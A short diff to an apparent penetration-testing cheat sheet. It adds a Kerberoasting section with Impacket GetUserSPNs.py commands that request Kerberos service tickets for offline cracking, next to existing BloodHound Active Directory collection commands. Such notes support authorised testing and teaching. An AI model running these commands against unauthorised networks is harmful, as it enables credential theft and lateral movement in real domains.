@@ -148,3 +148,12 @@ https://github.com/BloodHoundAD/BloodHound/releases
 sudo bloodhound-python -u '`username`' -p '`password`' -ns `ip` -d `domain` -c all
 
 nxc ldap `ip` -u `isername` -p `password` --bloodhound --collection All
+
+## Kerberoasting
+
+**GetUserSPNs.py**
+
+sudo python3 -m pip install .
+
+GetUserSPNs.py -dc-ip `ip` `domain`/`username` -request -outputfile `filename`
+GetUserSPNs.py -dc-ip `ip` `domain`/`username` -request-user `username`
